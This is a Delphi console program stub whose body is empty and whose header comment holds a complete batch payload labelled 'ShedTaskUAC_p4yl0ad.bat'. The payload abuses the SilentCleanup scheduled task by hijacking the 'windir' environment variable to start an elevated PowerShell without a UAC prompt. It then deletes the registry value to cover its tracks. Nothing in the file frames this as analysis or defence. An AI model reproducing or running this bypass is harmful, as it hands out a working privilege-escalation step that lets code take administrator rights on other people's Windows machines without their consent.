program QuietShower_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
echo "ShedTaskUAC_p4yl0ad.bat"
@echo off
timeout /t 5 >nul
reg add "HKCU\Environment" /v "windir" /d "cmd /c start powershell&REM " >nul
timeout /t 8 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 7 >nul
reg delete "HKCU\Environment" /v "windir" /F
timeout /t 5 >nul

}

//https://docs.microsoft.com/en-us/archive/msdn-magazine/2017/may/c-use-modern-c-to-access-the-windows-registry

uses
  System.SysUtils;

begin
  try
    { TODO -oUser -cConsole Main : Insert code here }

  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
